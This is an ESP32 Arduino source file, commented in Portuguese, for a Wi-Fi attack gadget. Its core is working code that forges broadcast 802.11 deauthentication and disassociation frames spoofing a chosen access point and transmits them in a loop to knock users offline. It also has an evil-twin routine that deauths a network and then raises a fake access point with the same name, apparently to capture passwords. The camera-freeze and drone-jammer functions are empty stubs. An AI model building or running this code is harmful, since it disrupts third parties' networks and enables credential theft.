#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// DEAUTH FRAME - EXATAMENTE como o ESP32Marauder
// 
// Frame Control: 0xC0 = Deauth
// Duration: 0x3A, 0x01 = 314us
// DA: Broadcast (ff:ff:ff:ff:ff:ff)
// SA: AP MAC (preenchido em runtime)
// BSSID: AP MAC (preenchido em runtime)
// Seq Ctrl: 0xF0, 0xFF = 0xFFF0 (sequence number alto, aceito pelo driver)
// Reason Code: 0x02, 0x00 = Reason 2 (prev auth expired)
// ============================================================
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0xF0, 0xFF,             // Seq Ctrl: 0xFFF0 [22]
    0x02, 0x00              // Reason: 2 = Previous authentication expired [24]
};

// Disassociation frame
static uint8_t disassocFrame[26] = {
    0xA0, 0x00,             // Frame Control: Disassociation
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0xFF,
    0x02, 0x00
};

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static uint32_t deauthFailCount = 0;

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;

    // NÃO muda modo WiFi aqui! Apenas escaneia.
    // O WiFi já deve estar em modo STA desde o setup()
    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// DEAUTH - BASEADO NO ESP32MARAUDER + RISINEK
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // Salva info
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    // Preenche frames com MAC do AP
    setMAC(deauthFrame, target->bssid, 10);  // SA = AP
    setMAC(deauthFrame, target->bssid, 16);  // BSSID = AP

    setMAC(disassocFrame, target->bssid, 10);
    setMAC(disassocFrame, target->bssid, 16);

    // === CONFIGURAÇÃO CRÍTICA DO WIFI ===
    // 1. Modo STA (sem AP ativo)
    WiFi.mode(WIFI_STA);
    delay(100);

    // 2. Desconecta de qualquer AP (mas mantém interface ativa)
    WiFi.disconnect(false);
    delay(100);

    // 3. Promiscuous mode ON (inicializa hardware WiFi para raw TX)
    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
    Serial.printf("[Deauth] Promiscuous: %d\n", promisc_err);

    // 4. Desliga power save
    esp_wifi_set_ps(WIFI_PS_NONE);

    // 5. MUDA PARA O CANAL DO ALVO (ESSENCIAL!)
    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
    Serial.printf("[Deauth] Set channel: %d\n", chErr);

    // 6. Reseta contadores
    deauthActive = true;
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthFailCount = 0;

    Serial.println("[Deauth] STARTED");
}

void stopDeauth() { 
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Total: %lu pkts, %lu success, %lu failed\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount);
    }
    deauthActive = false;
    esp_wifi_set_promiscuous(false);
}

// ============================================================
// LOOP DE DEAUTH - SIMPLES E DIRETO (como o Marauder faz)
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    bool anySuccess = false;
    esp_err_t err;

    // Envia deauth frame
    // en_sys_seq = false (mantém nosso sequence number 0xFFF0)
    err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);

    if (err == ESP_OK) {
        deauthSuccessCount++;
        anySuccess = true;
    } else {
        deauthFailCount++;
    }
    deauthPacketCount++;

    // Pequeno delay para não saturar o driver
    delayMicroseconds(100);

    // Envia disassoc frame
    err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, false);

    if (err == ESP_OK) {
        deauthSuccessCount++;
        anySuccess = true;
    } else {
        deauthFailCount++;
    }
    deauthPacketCount++;

    // Debug a cada ~2 segundos
    static uint32_t lastDebug = 0;
    if (millis() - lastDebug > 2000) {
        lastDebug = millis();
        float rate = (deauthPacketCount > 0) ? 
            ((float)deauthSuccessCount / deauthPacketCount * 100.0) : 0;
        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu rate=%.1f%% ch=%d\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount, 
            rate, deauthTargetChannel);
    }

    return anySuccess;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678");
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
